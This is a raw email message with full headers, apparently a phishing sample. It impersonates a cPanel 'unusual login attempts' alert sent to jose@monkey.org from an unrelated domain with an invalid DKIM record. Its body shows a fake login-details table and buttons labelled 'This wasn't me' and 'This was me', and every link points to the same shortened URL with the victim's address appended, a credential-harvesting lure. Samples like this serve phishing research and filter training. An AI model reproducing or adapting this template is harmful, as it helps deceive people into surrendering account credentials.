@@ -1,0 +1,357 @@
+Return-Path: info@w101turbormachinery.com
+Delivered-To: jose@monkey.org
+X-FDA: 82814305476.18.8277D80
+Received: from mail.w101turbormachinery.com (mail.w101turbormachinery.com
+ [91.194.11.167])	by imf29.b.hostedemail.com (Postfix) with ESMTP id
+ 48E9412000B	for <jose@monkey.org>; Fri, 22 Nov 2024 16:45:05 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;	dkim=none ("invalid DKIM
+ record") header.d=w101turbormachinery.com header.s=202410 header.b=IhVYGJqJ;
+	spf=pass (imf29.b.hostedemail.com: domain of info@w101turbormachinery.com
+ designates 91.194.11.167 as permitted sender)
+ smtp.mailfrom=info@w101turbormachinery.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1732293786;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=/A4B3nsKfhKGBM44YAUkASdC9t7gh8djL+NTtKe8XKk=;
+	b=wMcsMbmB2ydP/GumqeYUa7UYVgK+VmG2wpL1dCFAP4uX5l/hl6re/hftxuY1zmdPsHmh22
+	YHhC9FIGTSM1qivlLSSRlfDw3sMTIAbuXd2VXK8PkVdey7WxtZUiHK8qrobB912uMXbdX4
+	gzr5V+KCuB3cz3bZJg+SKNJDSPFIIKM=
+ARC-Authentication-Results: i=1;	imf29.b.hostedemail.com;	dkim=none ("invalid
+ DKIM record") header.d=w101turbormachinery.com header.s=202410
+ header.b=IhVYGJqJ;	spf=pass (imf29.b.hostedemail.com: domain of
+ info@w101turbormachinery.com designates 91.194.11.167 as permitted sender)
+ smtp.mailfrom=info@w101turbormachinery.com;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1732293786; a=rsa-sha256;
+	cv=none;
+	b=7wt0teqmFjFhO3O20q3s0pZVeu3bUVf6cvcgRcFgLfaIs+IrJpSBlXmJ1ipD0OTj7DaZ3g
+	8nM4YE4hkxxmVLpOxm6a7xKaBbmmYVAY7rWLaC57lF+vYt+pcnG5yeR3W/OnL2UHrp6BOQ
+	nLDhKQMFgV1ZqWxzEVy5jMLY/IB8xgc=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+	d=w101turbormachinery.com; s=202410; t=1732293940;
+	bh=YHm3UsStuRpCprdrEOCL8Huvw5RWKp2pErF7wQmU2gI=;
+	h=Reply-To:From:To:Subject:Date:From;
+	b=IhVYGJqJiiV7CyvKcL6fZGpzulEiCXS81D643JM59lJC4kYo8mCRtpRtSSW5cWox6
+	 YOTSX6sX3Ir4jinsYRHS5lQZLDk3qXSiPF9GBr6VA84l2pw7E97JXP/85VMAe2m+sb
+	 Sk60AxucZZNMWfCI1gqKGgmKSWXiIqWB88JysT98RV8SPk32Jv/NsYpqj0ZbS4keK1
+	 3QmZ0VpUXqU1eXrjLrJE/tK+wqAM4USeOLU6lvUcvl0oxwrZptnj3Lv+aeTrORCH0c
+	 g6huUvlwyFBc5hzVwV//zeiIpXIMHpduXlRvEOCc0qbN3fiFCwlT42h1tY+ICOsyKd
+	 KndvFJZkKL7KA==
+Received: from [109.248.150.220] (unknown [109.248.150.220])
+	by mail.w101turbormachinery.com (Postfix) with ESMTPA id 77525A76F6
+	for <jose@monkey.org>; Fri, 22 Nov 2024 11:45:40 -0500 (EST)
+Reply-To: cPanel@monkey.org
+From: cPanel via monkey.org <info@w101turbormachinery.com>
+To: jose@monkey.org
+Subject: Unusual login attempts on your jose@monkey.org
+Date: 22 Nov 2024 17:45:39 +0100
+Message-ID: <20241122174539.F44D47D9BED15240@w101turbormachinery.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 48E9412000B
+X-Rspamd-Server: rspam08
+X-Spam-Status: No, score=1.00
+X-Stat-Signature: 7p4bqoj6b8cxms71idj59gnktbgu6kqf
+X-HE-Tag: 1732293905-727552
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/rcbW+qFtU+7rY7OZshcD8L22FouXXuFBAVuGo270C+jx?=
+ =?utf-8?q?jF70oa0VJMBX0xQP6NUbSz9dvAlLbBuUV6MCUHZE69MupPOeHV8ygoN/HsvZFixJt?=
+ =?utf-8?q?tljmllbXGNTHaov7HyBpGL3KukZaNhEb9GUh9rI5ftDLSpK906wbX5Dvq5TAZVAkX?=
+ =?utf-8?q?cFNjcYC4I+Cb3ZF3FuFiQklajK4mN5A9LwpJm3IwFM2QyOmu4zwDc3hMVBY9fPejI?=
+ =?utf-8?q?DgXIJtZLPjeASF0TfXfi9WIJamCCApeGWR8YLT34Lcvs1GNWI/fBPL52+2VAkmMnR?=
+ =?utf-8?q?8Cwr39ZRSi/aqgawLUcYOorapTZJl+6gxoXCKVT6rkJohKenVDO+kdggUI/Qmq2cN?=
+ =?utf-8?q?W0spqM/gsIB9KvZpcNLKUFY+diHU16QVC75SVG+IcELgU5TpnMtLroeUlIpdUtOXm?=
+ =?utf-8?q?JlUOA7WzNavt40fIZIq2XT5tfJYCCKVChp9kqCTsiUr+gYz5sGHrO3Ke8sYGGTuSs?=
+ =?utf-8?q?5vU9TlwSiT6I8I3kuv/gWhztXur5YSY7UHExOdoiYErHN7PfP4X7B5vKSb0OaN6eT?=
+ =?utf-8?q?du9nYOtmoEOw1KDSvztQeoErkXyzrYNJAAHfOwTLAfXeYyqzvnLblwbmxn6vlBGrK?=
+ =?utf-8?q?yNZxufGWw1d9PIctN9rPxh+bNh2VWF9Nkn+Y9PWrhAmxedmQ+trIQvnllsxcyaB5v?=
+ =?utf-8?q?S5u7ZCibA2bBKdWshlqaJF8HdwvjEtl4iprSJRDUn4x6hku45xIFaXzsFfxux7Z0O?=
+ =?utf-8?q?J3ktB53tFuD7KcoYBs1v6rwEA81o5QstlPbG1NQyVPqsSFhBNZAfvTy1+FM0jBsl2?=
+ =?utf-8?q?Nb+W6jwo8WgHpGxLtnrY5DtBaC0maS413A63G3He0+uOtrMGQ1zXMQFhJEHA6N+tW?=
+ =?utf-8?q?zw8Y2DLYSs+kJqTU/LhgMBfslVYooTBfA0uto2Qsf9a1XCwQk2kzafECqI8i54d0R?=
+ =?utf-8?q?RQe+dsLgwJP6F3H5OKSSxn_hG1deSyUVlPd/0DC4tNBF9XNKyQh+ivCgSqyVYgzNt?=
+ =?utf-8?q?WGr8DEObvzpeLiTf1AnL+w+CMeNU+bPYQSxTeHTWN61Bky6gBBfT2azU5f9vcZwW4?=
+ =?utf-8?q?Ax5sKcy3A4yviCSkisjp+tx8SMlDQ7az7XqbbPqN9DyJZFYJAzs9rusI5GunI7ZNz?=
+ =?utf-8?q?DqRnuwD/u6AHx5cqkhbLG10k0aQs/5lcLwXZ0+BHfb1CgzWns4UQWSS8quMfgWTqC?=
+ =?utf-8?q?cGU2O+wXarR8SN+9YYHMt67wd6GffdSWlVLxXseD4WzXG92aLEQU1iUnCndeqvIM5?=
+ =?utf-8?q?CF4X6w7zTqXPV9DVXCDXmEn23rLdtMYGvTT/uEgudI+wtQf1O/+speuoYn+Rq/4Hu?=
+ =?utf-8?q?tEAzYc22LcLKI2BzTdB0K1lEoj22CfmiEqioGZ2wqyCWDYObgKDgKkrcnlAv4eCqG?=
+ =?utf-8?q?n7LvVYGARWxgrEth7F6qtLbNhJEIuAyvgiY16+xoUudVtVyR9WHAIY0+DK/iVVj1y?=
+ =?utf-8?q?313L06b4VCsSchmsDxH/QjRRqH3K+AAcAADXV1fgoLpYQdH5YVnFIpHHUYqCTLdHa?=
+ =?utf-8?q?YXVXPpaFBnUa3bgq7LaT7EVygq6qCVLFJiqm0orxth5Z3yC6QhryjnlSoQPMpWi1K?=
+ =?utf-8?q?L3kvaZ54yKQG1ZmIb2DmDlkGiMkuctqtFDCWo1rQ=3D=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 355
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;">
+<h1 style=3D'text-align: left; color: rgb(23, 43, 77); text-transform: none=
+; line-height: 28px; text-indent: 0px; letter-spacing: -0.01em; font-family=
+: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "F=
+ira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 24px; fon=
+t-style: normal; font-weight: 500; margin-top: 40px; margin-bottom: 0px; wo=
+rd-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; w=
+idows: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>Unusual
+
+  login attempts on your&nbsp;monkey.org<span style=3D"box-sizing: border-b=
+ox;">&nbsp;</span>account</h1>
+<p style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: none; =
+line-height: 20px; text-indent: 0px; letter-spacing: 0em; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; margin-top: 12px; margin-bottom: 1rem; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>Hello
+
+  jose,</p>
+<p style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: none; =
+line-height: 20px; text-indent: 0px; letter-spacing: 0em; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; margin-top: 12px; margin-bottom: 1rem; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>We
+
+  noticed some unusual login activity with your account.</p>
+<div style=3D'padding: 15px; text-align: left; color: rgb(9, 30, 66); text-=
+transform: none; text-indent: 0px; letter-spacing: normal; font-family: -ap=
+ple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira S=
+ans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-s=
+izing: border-box; orphans: 2; widows: 2; background-color: rgb(219, 235, 2=
+55); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;'>
+  <table width=3D"100%" style=3D"width: 490px; font-size: 13px; border-coll=
+apse: collapse; table-layout: auto; box-sizing: border-box;">
+    <tbody style=3D"box-sizing: border-box;">
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Email</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><a style=3D"color: rgb(17,=
+ 85, 204); text-decoration: none; box-sizing: border-box; background-color:=
+ transparent;">jose@monkey.org</a></div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Time</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">&nbsp;11/22/2024 5:45:39 p=
+=2Em..
+            (UTC)</div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Location</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">
+            <div style=3D"box-sizing: border-box;">New York, USA.</div>
+          </div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Device</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">Windows 10</div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Browser</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">Chrome</div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">IP&nbsp;address&nbsp;&nbsp;</strong></=
+div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">61.13.16.238</div>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+<p style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: none; =
+line-height: 20px; text-indent: 0px; letter-spacing: 0em; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; margin-top: 12px; margin-bottom: 1rem; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>To
+
+  make sure your account is secure, let us know if this was you.</p>
+<div style=3D'width: 520px; text-align: left; color: rgb(9, 30, 66); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; word-spacing: 0px; display: inline-block; whit=
+e-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background-=
+color: rgb(255, 255, 255); font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial;'>
+  <div style=3D"text-align: center; box-sizing: border-box;">
+    <div style=3D"margin-bottom: 20px; display: inline-block; box-sizing: b=
+order-box;">
+<a style=3D"background: rgb(244, 245, 247); margin: 0px; padding: 0px 12px;=
+ border-radius: 3px; height: 2.28em; text-align: center; color: rgb(80, 95,=
+ 121); line-height: 2.28em; font-style: normal; text-decoration: none; vert=
+ical-align: middle; display: inline-flex; white-space: nowrap; box-sizing: =
+border-box;" href=3D"https://t.ly/kYS6r#jose@monkey.org" target=3D"_blank" =
+rel=3D"noreferrer">
+<span style=3D"width: 230px; box-sizing: border-box;"><strong style=3D"font=
+-weight: bolder; box-sizing: border-box;">This
+            wasn't me</strong></span></a></div>
+    <span style=3D"box-sizing: border-box;">&nbsp;</span><span style=3D"box=
+-sizing: border-box;">&nbsp;</span><span>&nbsp;</span>
+    <div style=3D"margin-bottom: 20px; display: inline-block; box-sizing: b=
+order-box;">
+<a style=3D"background: rgb(244, 245, 247); margin: 0px; padding: 0px 12px;=
+ border-radius: 3px; height: 2.28em; text-align: center; color: rgb(80, 95,=
+ 121); line-height: 2.28em; font-style: normal; text-decoration: none; vert=
+ical-align: middle; display: inline-flex; white-space: nowrap; box-sizing: =
+border-box;" href=3D"https://t.ly/kYS6r#jose@monkey.org" target=3D"_blank" =
+rel=3D"noreferrer">
+<span style=3D"width: 230px; box-sizing: border-box;"><strong style=3D"font=
+-weight: bolder; box-sizing: border-box;">This
+            was me</strong></span></a></div>
+  </div>
+</div>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+
+<span style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: -apple-system, bl=
+inkmacsystemfont, "segoe ui", roboto, oxygen, ubuntu, "fira sans", "droid s=
+ans", "helvetica neue", sans-serif; font-size: 14px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; float: none; display: inline !important;=
+ white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgr=
+ound-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'><span style=3D"box-sizing: border=
+-box;">&nbsp;</span></span><span>&nbsp;</span>
+<a style=3D'background: none; text-align: left; color: rgb(0, 82, 204); tex=
+t-transform: none; text-indent: 0px; letter-spacing: normal; font-family: -=
+apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira=
+ Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-s=
+tyle: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; w=
+hite-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-var=
+iant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px;' href=3D"https://t.ly/kYS6r#jose@monkey.org=
+" target=3D"_blank" rel=3D"noreferrer">Why
+
+    am I getting this email?</a></p>
+<hr style=3D'border-width: 0px 0px 1px; height: 0px; text-align: left; colo=
+r: rgb(9, 30, 66); text-transform: none; text-indent: 0px; letter-spacing: =
+normal; overflow: visible; font-family: -apple-system, BlinkMacSystemFont, =
+"Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sans", "Droid Sans", "Helvetica N=
+eue", sans-serif; font-size: 14px; font-style: normal; font-weight: 400; ma=
+rgin-top: 24px; margin-bottom: 24px; word-spacing: 0px; border-top-color: r=
+gba(0, 0, 0, 0.1); border-top-style: solid;=20
+border-bottom-style: solid; white-space: normal; box-sizing: content-box; o=
+rphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-li=
+gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial;'>
+<div style=3D'text-align: center; color: rgb(112, 112, 112); text-transform=
+: none; line-height: 19px; text-indent: 0px; letter-spacing: normal; font-f=
+amily: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubunt=
+u, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 13px=
+; font-style: normal; font-weight: 400; margin-top: 10px; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'><br class=3D"Apple-interchange-ne=
+wline">
+  <table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse=
+; box-sizing: border-box;" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+    <tbody style=3D"box-sizing: border-box;">
+      <tr style=3D'text-align: center; color: rgb(112, 112, 112); text-tran=
+sform: none; text-indent: 0px; letter-spacing: normal; font-family: -apple-=
+system, "system-ui", "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sans", "Droi=
+d Sans", "Helvetica Neue", sans-serif; font-size: 13px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; box-sizing: bord=
+er-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
+ariant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial;'>
+        <td align=3D"center" valign=3D"top" style=3D"margin: 0px; text-alig=
+n: center; line-height: 18px; padding-top: 0px; font-size: 12px; box-sizing=
+: border-box;"><span style=3D"box-sizing: border-box;">This message was sen=
+t to you
+            by&nbsp;cPanel Cloud<br style=3D"box-sizing: border-box;">
+            11/22/2024 5:45:39 p.m..</span></td>
+      </tr>
+      <tr valign=3D"top" style=3D'text-align: center; color: rgb(112, 112, =
+112); text-transform: none; text-indent: 0px; letter-spacing: normal; font-=
+family: -apple-system, "system-ui", "Segoe UI", Roboto, Oxygen, Ubuntu, "Fi=
+ra Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 13px; font=
+-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; b=
+ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;'>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+
+
+</body></html>
+
